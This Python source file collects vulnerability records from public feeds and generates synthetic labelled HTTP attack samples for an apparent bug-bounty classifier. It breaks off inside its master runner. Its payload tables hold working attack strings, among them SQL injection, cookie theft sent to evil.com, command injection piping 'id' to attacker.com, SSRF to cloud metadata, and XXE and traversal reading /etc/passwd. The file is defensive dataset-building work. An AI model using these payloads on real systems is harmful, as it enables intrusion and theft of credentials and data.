"""
live_data_collector.py
======================
Advanced live data collector for Bug Bounty ML model.

Sources (all free, no auth required):
  1. NVD CVE v2 API           — 200k+ CVEs with CVSS scores & CWE tags
  2. GitHub Advisory Database  — Reviewed security advisories
  3. CISA KEV                  — 1600+ actively exploited vulnerabilities
  4. OSV.dev                   — Open Source Vulnerabilities
  5. HackerOne public reports  — Real bug-bounty disclosures
  6. PayloadsAllTheThings       — Attack payload library (GitHub raw)
  7. Nuclei Templates          — 9000+ PoC templates (GitHub API)

Output: data/raw/*.json  (incremental, resumable)
"""

import os, sys, json, time, re, random, hashlib, io, zipfile
import requests
from pathlib import Path
from datetime import datetime, timedelta
from typing import Optional, Iterator
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import quote

from paths import RAW_DIR

RAW_DIR.mkdir(parents=True, exist_ok=True)

SESSION = requests.Session()
SESSION.headers.update({"User-Agent": "BugBountyML/2.0 (research, github.com/sire-model)"})

# ── Vulnerability taxonomy (extended) ─────────────────────────────────────────
VULN_LABELS = [
    "benign",
    # Injection
    "sqli", "nosqli", "xxe", "ssti", "ldap_injection", "xpath_injection",
    # XSS family
    "xss", "dom_xss", "stored_xss",
    # Access control
    "idor", "bola", "privilege_escalation", "auth_bypass", "broken_access_control",
    # Server-side
    "ssrf", "rce", "lfi", "rfi", "path_traversal", "deserialization",
    # Client-side
    "csrf", "open_redirect", "clickjacking", "cors_misconfiguration",
    # Info / Logic
    "info_disclosure", "business_logic", "race_condition",
    # Supply chain / config
    "dependency_confusion", "secrets_exposure", "misconfig",
    # Extra
    "account_takeover", "data_exfiltration", "financial_fraud",
]

NUM_CLASSES = len(VULN_LABELS)   # 34

# CWE → VULN_LABEL mapping (for NVD/GitHub data)
CWE_MAP = {
    "CWE-89":  "sqli",    "CWE-564": "sqli",
    "CWE-943": "nosqli",
    "CWE-611": "xxe",     "CWE-776": "xxe",
    "CWE-94":  "ssti",    "CWE-1336":"ssti",
    "CWE-79":  "xss",     "CWE-80":  "xss",     "CWE-83":  "dom_xss",
    "CWE-639": "idor",    "CWE-284": "broken_access_control",
    "CWE-862": "broken_access_control", "CWE-863": "broken_access_control",
    "CWE-269": "privilege_escalation",
    "CWE-287": "auth_bypass", "CWE-306": "auth_bypass",
    "CWE-918": "ssrf",
    "CWE-78":  "rce",     "CWE-77":  "rce",     "CWE-95":  "rce",
    "CWE-22":  "path_traversal", "CWE-23": "path_traversal",
    "CWE-98":  "lfi",
    "CWE-502": "deserialization",
    "CWE-352": "csrf",
    "CWE-601": "open_redirect",
    "CWE-1021":"clickjacking",
    "CWE-200": "info_disclosure", "CWE-209": "info_disclosure",
    "CWE-362": "race_condition",
    "CWE-798": "secrets_exposure", "CWE-312": "secrets_exposure",
    "CWE-16":  "misconfig", "CWE-1188":"misconfig",
}

SEVERITY_MAP = {"none":0,"low":1,"medium":2,"high":3,"critical":4,
                "NONE":0,"LOW":1,"MEDIUM":2,"HIGH":3,"CRITICAL":4}

def label_from_cwes(cwes: list) -> str:
    for cwe in cwes:
        if cwe in CWE_MAP:
            return CWE_MAP[cwe]
    return "info_disclosure"   # fallback

def label_from_text(text: str) -> str:
    t = text.lower()
    rules = [
        ("sql inject",          "sqli"),
        ("nosql inject",        "nosqli"),
        ("xml external entity", "xxe"),   ("xxe",  "xxe"),
        ("template inject",     "ssti"),  ("ssti", "ssti"),
        ("cross-site script",   "xss"),   (" xss ", "xss"),
        ("server-side request", "ssrf"),  ("ssrf", "ssrf"),
        ("remote code execut",  "rce"),   (" rce ", "rce"),
        ("path traversal",      "path_traversal"),
        ("directory traversal", "path_traversal"),
        ("insecure direct obj", "idor"),  ("idor", "idor"),
        ("open redirect",       "open_redirect"),
        ("csrf",                "csrf"),  ("cross-site request forgery","csrf"),
        ("privilege escalat",   "privilege_escalation"),
        ("auth bypass",         "auth_bypass"),
        ("deserialization",     "deserialization"),
        ("race condition",      "race_condition"),
        ("business logic",      "business_logic"),
        ("information disclos", "info_disclosure"),
        ("local file inclus",   "lfi"),
        ("remote file inclus",  "rfi"),
        ("stored xss",          "stored_xss"),
        ("dom-based xss",       "dom_xss"),
        ("cors misconfigur",    "cors_misconfiguration"),
        ("secrets",             "secrets_exposure"),
        ("misconfigur",         "misconfig"),
    ]
    for pattern, label in rules:
        if pattern in t:
            return label
    return None   # unknown → will be filtered

# ─── Retry helper ─────────────────────────────────────────────────────────────
def get_json(url, params=None, retries=3, delay=2.0, **kwargs):
    for attempt in range(retries):
        try:
            r = SESSION.get(url, params=params, timeout=20, **kwargs)
            if r.status_code == 429 or r.status_code == 503:
                try:
                    wait = int(r.headers.get("Retry-After", 0) or 0)
                except (TypeError, ValueError):
                    wait = 0
                wait = max(wait, 10 if r.status_code == 429 else 5)
                print(f"  ⚠ Rate limited — sleeping {wait}s")
                time.sleep(wait)
                continue
            if r.status_code == 200:
                return r.json()
            print(f"  HTTP {r.status_code} for {url}")
            return None
        except Exception as e:
            print(f"  Error ({attempt+1}/{retries}): {e}")
            time.sleep(delay * (attempt + 1))
    return None

# ─── 1. NVD CVE v2 ────────────────────────────────────────────────────────────
NVD_URL = "https://services.nvd.nist.gov/rest/json/cves/2.0"
NVD_KEYWORDS = [
    "SQL injection", "cross-site scripting", "server-side request forgery",
    "remote code execution", "path traversal", "XML external entity",
    "deserialization", "authentication bypass", "privilege escalation",
    "open redirect", "CSRF", "IDOR", "insecure direct object", "race condition",
    "template injection", "local file inclusion", "command injection",
    "CORS misconfiguration", "secrets exposure", "security misconfiguration",
    "broken access control", "NoSQL injection", "stored XSS", "DOM XSS",
]

def fetch_nvd(max_per_keyword=500, api_key: str = None) -> list:
    """Fetch CVEs from NVD. Yields labeled records."""
    records = []
    headers = {}
    if api_key:
        headers["apiKey"] = api_key  # 50 req/30s with key vs 5/30s without

    out_path = RAW_DIR / "nvd_cves.json"
    existing = json.loads(out_path.read_text()) if out_path.exists() else []
    seen_ids = {r["id"] for r in existing}
    print(f"[NVD] Resuming — {len(existing)} existing CVEs")

    for keyword in NVD_KEYWORDS:
        print(f"[NVD] Keyword: '{keyword}'")
        start = 0
        per_page = 100
        fetched = 0

        while fetched < max_per_keyword:
            data = get_json(NVD_URL, params={
                "keywordSearch": keyword,
                "startIndex": start,
                "resultsPerPage": per_page,
            }, headers=headers)
            if not data:
                break

            for item in data.get("vulnerabilities", []):
                cve = item.get("cve", {})
                cve_id = cve.get("id", "")
                if cve_id in seen_ids:
                    continue
                seen_ids.add(cve_id)

                descs = cve.get("descriptions", [])
                desc = next((d["value"] for d in descs if d["lang"] == "en"), "")

                cwes = [
                    d["value"]
                    for w in cve.get("weaknesses", [])
                    for d in w.get("description", [])
                    if d.get("value", "").startswith("CWE-")
                ]

                metrics = cve.get("metrics", {})
                cvss31 = metrics.get("cvssMetricV31", [{}])[0].get("cvssData", {})
                cvss30 = metrics.get("cvssMetricV30", [{}])[0].get("cvssData", {})
                cvss   = cvss31 or cvss30
                severity = cvss.get("baseSeverity", "UNKNOWN")
                score    = float(cvss.get("baseScore", 0.0))

                label = label_from_cwes(cwes) or label_from_text(desc)
                if not label:
                    continue

                records.append({
                    "id":          cve_id,
                    "source":      "nvd",
                    "text":        f"{cve_id}: {desc}",
                    "label":       label,
                    "severity":    severity.lower(),
                    "cvss_score":  score,
                    "cwes":        cwes,
                    "keyword":     keyword,
                })
                fetched += 1

            total = data.get("totalResults", 0)
            start += per_page
            if start >= min(total, max_per_keyword):
                break

            time.sleep(0.7)  # NVD rate: ~5 req/30s without API key

        print(f"  → {fetched} new CVEs for '{keyword}'")

    all_records = existing + records
    out_path.write_text(json.dumps(all_records, indent=2))
    print(f"[NVD] Total: {len(all_records)} CVEs saved")
    return all_records


# ─── 2. GitHub Advisory Database ─────────────────────────────────────────────
GH_ADVISORY_URL = "https://api.github.com/advisories"
GH_ECOSYSTEMS = ["go", "npm", "pip", "rubygems", "maven", "nuget"]

def fetch_github_advisories(github_token: str = None, max_records: int = 2000) -> list:
    headers = {
        "Accept": "application/vnd.github+json",
        "X-GitHub-Api-Version": "2022-11-28",
    }
    if github_token:
        headers["Authorization"] = f"Bearer {github_token}"

    out_path = RAW_DIR / "github_advisories.json"
    existing = json.loads(out_path.read_text()) if out_path.exists() else []
    seen = {r["id"] for r in existing}
    print(f"[GH] Resuming — {len(existing)} existing advisories")
    if len(existing) >= max_records:
        print(f"[GH] Target already satisfied by cache ({len(existing)} >= {max_records})")
        return existing

    records = []
    for ecosystem in GH_ECOSYSTEMS:
        page = 1
        empty_labeled_pages = 0
        print(f"[GH] Ecosystem: {ecosystem}")
        while len(records) + len(existing) < max_records:
            data = get_json(GH_ADVISORY_URL, params={
                "type": "reviewed",
                "per_page": 100,
                "page": page,
                "ecosystem": ecosystem,
            }, headers=headers)

            if not data or not isinstance(data, list):
                break
            if len(data) == 0:
                break

            before = len(records)
            for adv in data:
                ghsa_id = adv.get("ghsa_id", "")
                if ghsa_id in seen:
                    continue
                seen.add(ghsa_id)

                summary = adv.get("summary", "")
                detail  = adv.get("description", "")
                text    = f"{summary}. {detail}"

                cwes = [c.get("cwe_id", "") for c in adv.get("cwes", [])]
                severity = adv.get("severity", "unknown")
                score = float(adv.get("cvss", {}).get("score", 0.0) or 0.0)

                label = label_from_cwes(cwes) or label_from_text(text)
                if not label:
                    continue

                records.append({
                    "id":         ghsa_id,
                    "source":     "github_advisory",
                    "text":       text.strip(),
                    "label":      label,
                    "severity":   severity,
                    "cvss_score": score,
                    "cwes":       cwes,
                    "ecosystem":  ecosystem,
                })
                if len(records) + len(existing) >= max_records:
                    break

            print(f"[GH] {ecosystem} page {page} — +{len(records)-before} labeled advisories")
            if len(records) == before:
                empty_labeled_pages += 1
                if empty_labeled_pages >= 3:
                    print(f"[GH] {ecosystem}: stopping after {empty_labeled_pages} empty labeled pages")
                    break
            else:
                empty_labeled_pages = 0
            if len(records) + len(existing) >= max_records:
                break
            page += 1
            if len(data) < 100:
                break
            time.sleep(0.5)

        if len(records) + len(existing) >= max_records:
            break

    all_records = existing + records
    out_path.write_text(json.dumps(all_records, indent=2))
    print(f"[GH] Total: {len(all_records)} advisories saved")
    return all_records


# ─── 3. CISA Known Exploited Vulnerabilities ─────────────────────────────────
CISA_KEV_URL = "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"

def fetch_cisa_kev() -> list:
    out_path = RAW_DIR / "cisa_kev.json"
    if out_path.exists():
        age = time.time() - out_path.stat().st_mtime
        if age < 86400:   # refresh daily
            existing = json.loads(out_path.read_text())
            print(f"[CISA] Using cached — {len(existing)} KEV entries")
            return existing

    print("[CISA] Fetching Known Exploited Vulnerabilities catalog...")
    data = get_json(CISA_KEV_URL)
    if not data:
        return []

    records = []
    for v in data.get("vulnerabilities", []):
        cve_id = v.get("cveID", "")
        name   = v.get("vulnerabilityName", "")
        desc   = v.get("shortDescription", "")
        product= v.get("product", "")
        text   = f"{name}: {desc} (product: {product})"

        label = label_from_text(text)
        if not label:
            label = "rce"   # KEV entries are almost always high-severity exploits

        records.append({
            "id":          cve_id,
            "source":      "cisa_kev",
            "text":        text,
            "label":       label,
            "severity":    "critical",   # all KEV = actively exploited
            "cvss_score":  9.0,
            "date_added":  v.get("dateAdded", ""),
            "ransomware":  v.get("knownRansomwareCampaignUse", "Unknown"),
        })

    out_path.write_text(json.dumps(records, indent=2))
    print(f"[CISA] Saved {len(records)} KEV entries")
    return records


# ─── 4. OSV (Open Source Vulnerabilities) ────────────────────────────────────
OSV_URL = "https://api.osv.dev/v1"
OSV_ECOSYSTEMS = ["PyPI", "npm", "Go", "Maven", "RubyGems", "NuGet", "crates.io"]
OSV_BULK_URL = "https://osv-vulnerabilities.storage.googleapis.com/{ecosystem}/all.zip"

def fetch_osv(max_per_ecosystem: int = 300) -> list:
    out_path = RAW_DIR / "osv_vulns.json"
    existing = json.loads(out_path.read_text()) if out_path.exists() else []
    seen = {r["id"] for r in existing}
    print(f"[OSV] Resuming — {len(existing)} existing entries")

    records = []
    for ecosystem in OSV_ECOSYSTEMS:
        print(f"[OSV] Loading bulk feed: {ecosystem}")
        fetched = 0
        url = OSV_BULK_URL.format(ecosystem=quote(ecosystem, safe=""))

        try:
            r = SESSION.get(url, timeout=60)
            if r.status_code != 200:
                print(f"  HTTP {r.status_code}")
                continue
            archive = zipfile.ZipFile(io.BytesIO(r.content))
        except Exception as e:
            print(f"  OSV bulk error: {e}")
            continue

        for name in archive.namelist():
            if fetched >= max_per_ecosystem:
                break
            if not name.endswith(".json"):
                continue
            try:
                vuln = json.loads(archive.read(name))
            except Exception:
                continue

            osv_id = vuln.get("id", "")
            if not osv_id or osv_id in seen:
                continue
            seen.add(osv_id)

            summary = vuln.get("summary", "")
            detail  = vuln.get("details", "")
            text    = f"{summary}. {detail}"

            cwes = list(vuln.get("database_specific", {}).get("cwe_ids", []) or [])
            severity_data = vuln.get("severity", []) or []
            score = 0.0
            for sev in severity_data:
                if sev.get("type") in {"CVSS_V3", "CVSS_V4"}:
                    score_val = sev.get("score", "")
                    try:
                        score = float(score_val)
                    except (ValueError, TypeError):
                        score = 7.0
                    break

            label = label_from_cwes(cwes) or label_from_text(text)
            if not label:
                continue

            records.append({
                "id":          osv_id,
                "source":      "osv",
                "text":        text.strip(),
                "label":       label,
                "severity":    "high" if score >= 7 else "medium" if score >= 4 else "low",
                "cvss_score":  score,
                "ecosystem":   ecosystem,
                "cwes":        cwes,
            })
            fetched += 1

        print(f"  → {fetched} new labeled entries for {ecosystem}")
        time.sleep(0.3)

    all_records = existing + records
    out_path.write_text(json.dumps(all_records, indent=2))
    print(f"[OSV] Total: {len(all_records)} OSV vulns saved")
    return all_records


# ─── 5. HackerOne public disclosures ─────────────────────────────────────────
H1_GRAPHQL_URL = "https://hackerone.com/graphql"
H1_QUERY = """
query publicReports($cursor: String) {
  hacktivity_items(
    order_by: { field: popular }
    where: { report: { disclosed_at: { _is_null: false } } }
    first: 100
    after: $cursor
  ) {
    pageInfo { hasNextPage endCursor }
    edges {
      node {
        ... on HacktivityItem {
          report {
            id title vulnerability_information severity_rating
            weakness { name external_id }
            disclosed_at
          }
        }
      }
    }
  }
}
"""

def fetch_hackerone(max_pages: int = 20) -> list:
    out_path = RAW_DIR / "hackerone_reports.json"
    existing = json.loads(out_path.read_text()) if out_path.exists() else []
    seen = {r["id"] for r in existing}
    print(f"[H1] Resuming — {len(existing)} existing reports")

    records = []
    cursor = None

    for page in range(max_pages):
        try:
            r = SESSION.post(H1_GRAPHQL_URL,
                json={"query": H1_QUERY, "variables": {"cursor": cursor}},
                timeout=30)
            if r.status_code != 200:
                print(f"[H1] HTTP {r.status_code}")
                break
            data = r.json()
        except Exception as e:
            print(f"[H1] Error: {e}")
            break

        edges = data.get("data", {}).get("hacktivity_items", {}).get("edges", [])
        for edge in edges:
            report = edge.get("node", {}).get("report", {})
            if not report:
                continue
            rid = str(report.get("id", ""))
            if rid in seen:
                continue
            seen.add(rid)

            title   = report.get("title", "")
            desc    = report.get("vulnerability_information", "") or ""
            text    = f"{title}. {desc[:2000]}"
            weakness = report.get("weakness") or {}
            cwe      = weakness.get("external_id", "")
            severity = report.get("severity_rating", "none")

            label = label_from_cwes([cwe]) if cwe else label_from_text(text)
            if not label:
                label = label_from_text(title)
            if not label:
                continue

            records.append({
                "id":       rid,
                "source":   "hackerone",
                "text":     text.strip(),
                "label":    label,
                "severity": severity,
                "cvss_score": SEVERITY_MAP.get(severity, 0) * 2.0,
                "cwe":      cwe,
            })

        page_info = data.get("data", {}).get("hacktivity_items", {}).get("pageInfo", {})
        if not page_info.get("hasNextPage"):
            break
        cursor = page_info.get("endCursor")
        print(f"[H1] Page {page+1} — {len(records)} new reports")
        time.sleep(1.5)

    all_records = existing + records
    out_path.write_text(json.dumps(all_records, indent=2))
    print(f"[H1] Total: {len(all_records)} reports saved")
    return all_records


# ─── 6. PayloadsAllTheThings (GitHub raw) ─────────────────────────────────────
PATT_FILES = {
    "sqli":          "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/README.md",
    "xss":           "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/README.md",
    "ssrf":          "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Request%20Forgery/README.md",
    "ssti":          "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Template%20Injection/README.md",
    "path_traversal":"https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Directory%20Traversal/README.md",
    "xxe":           "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XXE%20Injection/README.md",
    "rce":           "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Command%20Injection/README.md",
    "open_redirect":  "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Open%20Redirect/README.md",
    "csrf":          "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/CSRF%20Injection/README.md",
    "lfi":           "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/README.md",
    "deserialization":"https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Insecure%20Deserialization/README.md",
    "idor":          "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Insecure%20Direct%20Object%20References/README.md",
}

def fetch_payloads_all_things() -> list:
    """Download payload libraries and extract labeled text samples."""
    out_path = RAW_DIR / "patt_payloads.json"
    if out_path.exists():
        existing = json.loads(out_path.read_text())
        print(f"[PATT] Using cached — {len(existing)} payload samples")
        return existing

    records = []
    for label, url in PATT_FILES.items():
        print(f"[PATT] Fetching {label} payloads…")
        try:
            r = SESSION.get(url, timeout=20)
            if r.status_code != 200:
                print(f"  HTTP {r.status_code}")
                continue
            content = r.text
        except Exception as e:
            print(f"  Error: {e}")
            continue

        # Extract code blocks and context paragraphs as samples
        lines = content.split("\n")
        current_section = ""
        for i, line in enumerate(lines):
            if line.startswith("#"):
                current_section = line.strip("# \r")
            if line.startswith("```") or (len(line) > 10 and not line.startswith("#")):
                # Grab surrounding context (window of 3 lines)
                context = " ".join(lines[max(0,i-2):i+3]).strip()
                if len(context) > 20:
                    records.append({
                        "id":         f"patt_{label}_{i}",
                        "source":     "payloads_all_things",
                        "text":       f"[{label.upper()}] {current_section}: {context[:500]}",
                        "label":      label,
                        "severity":   "high",
                        "cvss_score": 7.5,
                    })
        print(f"  → {sum(1 for r in records if r['label']==label)} samples for {label}")
        time.sleep(0.5)

    out_path.write_text(json.dumps(records, indent=2))
    print(f"[PATT] Total: {len(records)} payload samples saved")
    return records


# ─── 7. Advanced synthetic HTTP with real payloads ───────────────────────────
def generate_advanced_http(n_samples: int = 15000, payload_records: list = None) -> list:
    """
    Generate advanced labeled HTTP samples.
    Uses real payloads from PayloadsAllTheThings if available.
    Includes chain labeling for GNN training.
    """
    rng = random.Random(1337)
    
    # Group real payloads by label if available
    real_payloads = {}
    if payload_records:
        for rec in payload_records:
            lbl = rec["label"]
            real_payloads.setdefault(lbl, [])
            real_payloads[lbl].append(rec["text"][:200])

    PATTERNS = {
        "sqli": {
            "severity": "high", "cvss": 8.8,
            "paths": ["/search?q={p}", "/api/users?id={p}", "/login", "/products?cat={p}"],
            "payloads": ["' OR '1'='1", "' OR 1=1--", "1 UNION SELECT null,@@version--",
                        "admin'--", "' AND SLEEP(5)--", "1; DROP TABLE users--",
                        "' OR EXISTS(SELECT 1 FROM users)--", "') OR ('1'='1",
                        "1 AND 1=1", "' ORDER BY 1--", "' GROUP BY 1--"],
            "resp": ["SQL syntax", "mysql_fetch", "ORA-01756", "SQLiteException", "ODBC Driver"],
            "chains": ["auth_bypass", "info_disclosure", "rce"],
        },
        "xss": {
            "severity": "medium", "cvss": 6.1,
            "paths": ["/search?q={p}", "/comment", "/profile/bio", "/api/feedback"],
            "payloads": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
                        "javascript:alert(1)", "<svg onload=alert(1)>",
                        "\"><script>fetch('//evil.com?c='+document.cookie)</script>",
                        "<iframe src=javascript:alert(1)>", "'-alert(1)-'",
                        "</script><script>alert(1)</script>"],
            "resp": ["<script>alert(", "onerror=alert", "XSS"],
            "chains": ["csrf", "auth_bypass", "stored_xss"],
        },
        "ssrf": {
            "severity": "critical", "cvss": 9.3,
            "paths": ["/api/fetch?url={p}", "/proxy?target={p}", "/webhook?cb={p}"],
            "payloads": ["http://169.254.169.254/latest/meta-data/", "http://localhost:22",
                        "http://internal:8080/admin", "file:///etc/passwd",
                        "dict://localhost:6379/", "http://192.168.1.1/",
                        "http://[::1]/", "http://0.0.0.0:80/",
                        "http://localhost/server-status", "gopher://127.0.0.1:25/"],
            "resp": ["ami-id", "instance-id", "root:x:0:0", "169.254.169.254"],
            "chains": ["rce", "info_disclosure", "secrets_exposure"],
        },
        "idor": {
            "severity": "high", "cvss": 8.1,
            "paths": ["/api/users/{p}", "/api/orders/{p}", "/download?id={p}", "/profile?uid={p}"],
            "payloads": ["1337", "0", "-1", str(rng.randint(1,9999)),
                        "00001", "999999999", "2147483647", "../admin"],
            "resp": ['"email":', '"password":', '"credit_card":', '"ssn":', '"role":"admin"'],
            "chains": ["info_disclosure", "privilege_escalation", "data_exfiltration"],
        },
        "rce": {
            "severity": "critical", "cvss": 10.0,
            "paths": ["/api/exec?cmd={p}", "/eval?code={p}", "/api/system?run={p}"],
            "payloads": ["; id", "| whoami", "`id`", "$(whoami)",
                        "; cat /etc/passwd", "| curl attacker.com/$(id)",
                        "; ping -c 1 attacker.com", "|| id"],
            "resp": ["uid=", "root", "www-data", "command not found"],
            "chains": ["info_disclosure", "full_server_compromise"],
        },
        "ssti": {
            "severity": "critical", "cvss": 9.8,
            "paths": ["/render?tmpl={p}", "/api/report?name={p}", "/email/preview?subj={p}"],
            "payloads": ["{{7*7}}", "${7*7}", "{{config}}", "<%= 7*7 %>",
                        "{{''.__class__.__mro__[2].__subclasses__()}}",
                        "#{7*7}", "*{7*7}", "@{7*7}"],
            "resp": ["49", "uid=", "[werkzeug", "Undefined"],
            "chains": ["rce"],
        },
        "path_traversal": {
            "severity": "high", "cvss": 7.5,
            "paths": ["/download?file={p}", "/static?path={p}", "/read?name={p}"],
            "payloads": ["../../../etc/passwd", "..\\..\\..\\windows\\system.ini",
                        "....//....//etc/passwd", "%2e%2e%2fetc%2fpasswd",
                        "%252e%252e%252fetc%252fpasswd", "/etc/passwd",
                        "..%2F..%2F..%2Fetc%2Fpasswd"],
            "resp": ["root:x:0:0", "daemon:x:", "[boot loader]"],
            "chains": ["info_disclosure", "rce"],
        },
        "xxe": {
            "severity": "critical", "cvss": 9.1,
            "paths": ["/api/xml", "/upload/xml", "/import", "/parse"],
            "payloads": ['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]><foo>&xxe;</foo>'],
            "resp": ["root:x:0:0", "ami-id", "169.254.169.254"],
            "chains": ["ssrf", "info_disclosure"],
        },
        "auth_bypass": {
            "severity": "critical", "cvss": 9.4,
            "paths": ["/admin", "/api/admin", "/dashboard", "/api/internal"],
            "payloads": ["admin", "null", "undefined", "guest", "' OR 1=1--",
                        "eyJhbGciOiJub25lIn0.e30.", "0", "true"],
            "resp": ["Welcome admin", "admin panel", "You are logged in"],
            "chains": ["privilege_escalation", "data_exfiltration"],
        },
        "open_redirect": {
            "severity": "medium", "cvss": 6.1,
            "paths": ["/redirect?url={p}", "/login?next={p}", "/auth?redirect={p}"],
            "payloads": ["https://evil.com", "//evil.com", "/\\evil.com",
                        "https://evil.com%40legit.com", "https:evil.com",
                        "javascript:alert(1)", "data:text/html,<script>alert(1)</script>"],
            "resp": ["Location: https://evil.com", "Redirecting to"],
            "chains": ["auth_bypass", "xss", "phishing_chain"],
        },
        "deserialization": {
            "severity": "critical", "cvss": 9.8,
            "paths": ["/api/load", "/restore", "/deserialize"],
            "payloads": ["rO0ABXNy", "O:8:\"stdClass\"", "YToxOntpOjA7czoxOiJhIjt9",
                        "__reduce__", "pickle.loads"],
            "resp": ["uid=", "Java exception", "Deserialization error"],
            "chains": ["rce"],
        },
        "csrf": {
            "severity": "medium", "cvss": 6.5,
            "paths": ["/api/transfer", "/api/changepassword", "/api/delete"],
            "payloads": ["<form action='/transfer' method='POST'>", "no-cors",
                        "Origin: https://evil.com"],
            "resp": ["Transfer successful", "Password changed"],
            "chains": ["auth_bypass", "account_takeover"],
        },
        "info_disclosure": {
            "severity": "low", "cvss": 5.3,
            "paths": ["/.env", "/config.php.bak", "/api/debug", "/.git/config",
                     "/server-status", "/phpinfo.php", "/api/swagger.json"],
            "payloads": ["", "?debug=true", "?verbose=1"],
            "resp": ["DB_PASSWORD", "SECRET_KEY", "stack trace", "phpinfo()", "git"],
            "chains": ["sqli", "auth_bypass"],
        },
        "race_condition": {
            "severity": "high", "cvss": 8.1,
            "paths": ["/api/transfer", "/api/redeem", "/api/vote"],
            "payloads": ["concurrent_request", "parallel=true", "race=1"],
            "resp": ["Balance updated", "Coupon applied twice"],
            "chains": ["privilege_escalation", "financial_fraud"],
        },
        "business_logic": {
            "severity": "high", "cvss": 7.5,
            "paths": ["/api/price?qty=-1", "/checkout?discount=100", "/api/promo?code=AAAA"],
            "payloads": ["-1", "0", "999999", "NaN", "Infinity"],
            "resp": ["Price: -$", "Order total: $0", "Discount applied"],
            "chains": ["financial_fraud", "idor"],
        },
        "privilege_escalation": {
            "severity": "critical", "cvss": 8.8,
            "paths": ["/api/user/promote", "/admin/users?role=admin", "/api/sudo"],
            "payloads": ["role=admin", "isAdmin=true", "group=superuser", "priv=1"],
            "resp": ["Role updated", "You are now admin", "Privilege granted"],
            "chains": ["admin_access", "data_exfiltration"],
        },
        "cors_misconfiguration": {
            "severity": "high", "cvss": 8.1,
            "paths": ["/api/user", "/api/data", "/api/internal"],
            "payloads": ["Origin: https://evil.com", "Origin: null"],
            "resp": ["Access-Control-Allow-Origin: *",
                    "Access-Control-Allow-Origin: https://evil.com",
                    "Access-Control-Allow-Credentials: true"],
            "chains": ["auth_bypass", "data_exfiltration"],
        },
    }

    KNOWN_CHAINS = [
        ("sqli", "auth_bypass", "admin_access"),
        ("sqli", "rce", "full_server_compromise"),
        ("ssrf", "info_disclosure", "internal_network_access"),
        ("ssrf", "rce", "full_server_compromise"),
        ("xss", "csrf", "session_hijack"),
        ("xss", "auth_bypass", "account_takeover"),
        ("idor", "info_disclosure", "data_exfiltration"),
        ("idor", "privilege_escalation", "admin_access"),
        ("ssti", "rce", "full_server_compromise"),
        ("xxe", "ssrf", "internal_network_access"),
        ("path_traversal", "info_disclosure", "credential_dump"),
        ("open_redirect", "xss", "phishing_chain"),
        ("deserialization", "rce", "full_server_compromise"),
        ("auth_bypass", "privilege_escalation", "admin_access"),
        ("race_condition", "privilege_escalation", "admin_access"),
        ("business_logic", "idor", "financial_fraud"),
        ("info_disclosure", "sqli", "credential_dump"),
        ("cors_misconfiguration", "auth_bypass", "account_takeover"),
    ]

    samples = []
    n_benign = int(n_samples * 0.25)
    benign_paths = ["/", "/home", "/api/health", "/static/app.js", "/login",
                   "/api/users/me", "/api/products", "/logout", "/register"]

    for _ in range(n_benign):
        samples.append({
            "request": {"method": rng.choice(["GET","POST","PUT"]),
                       "path": rng.choice(benign_paths), "body": ""},
            "response": {"status_code": 200, "body_snippet": "<html>OK</html>"},
            "label": "benign", "severity": "none", "cvss_score": 0.0,
            "is_chain": False, "chain_impact": None,
        })

    vuln_names = list(PATTERNS.keys())
    n_per_vuln = (n_samples - n_benign) // len(vuln_names)

    for vtype, pat in PATTERNS.items():
        # Merge real payloads if available
        all_payloads = pat["payloads"].copy()
        if vtype in real_payloads:
            all_payloads.extend(rng.sample(real_payloads[vtype],
                                min(20, len(real_payloads[vtype]))))

        for _ in range(n_per_vuln):
            payload  = rng.choice(all_payloads)
            path_tmpl= rng.choice(pat["paths"])
            path     = path_tmpl.replace("{p}", payload[:100]) if "{p}" in path_tmpl else path_tmpl
            resp     = rng.choice(pat["resp"])

            # Chain detection
            chain_pairs = [(a,b,imp) for a,b,imp in KNOWN_CHAINS if a==vtype or b==vtype]
            is_chain = rng.random() < 0.40 and len(chain_pairs) > 0
            chain_impact = rng.choice(chain_pairs)[2] if is_chain else None

            samples.append({
                "request": {
                    "method": rng.choice(["GET","POST","PUT","DELETE"]),
                    "path": path,
                    "headers": {"Content-Type": rng.choice([
                        "application/json","application/x-www-form-urlencoded","text/xml"
                    ]), "User-Agent": "Mozilla/5.0"},
                    "body": payload if rng.random() < 0.6 else "",
                },
                "response": {
                    "status_code": rng.choice([200,200,500,302,403]),
                    "body_snippet": resp,
                },
                "label":        vtype,
                "severity":     pat["severity"],
                "cvss_score":   pat["cvss"],
                "is_chain":     is_chain,
                "chain_impact": chain_impact,
            })

    rng.shuffle(samples)
    out_path = RAW_DIR / "advanced_http_samples.json"
    out_path.write_text(json.dumps(samples, indent=2))
    print(f"[SYNTH] {len(samples)} advanced HTTP samples saved")
    return samples


# ─── Master collection runner ─────────────────────────────────────────────────
def collect_all(
    nvd_per_kw:    int = 300,
    gh_max:        int = 2000,
    osv_per_eco:   int = 200,
    h1_pages:      int = 10,
    synth_n:       int = 15000,
    github_token:  str = None,
    nvd_api_key:   str = None,
    skip_live:     bool = False,
) -> dict:
    summary = {"started": datetime.utcnow().isoformat()}

    print("\n" + "═"*70)
    print("  LIVE DATA COLLECTION — Advanced Bug Bounty Model")
    print("═"*70)

    if not skip_live:
        # Run live collectors
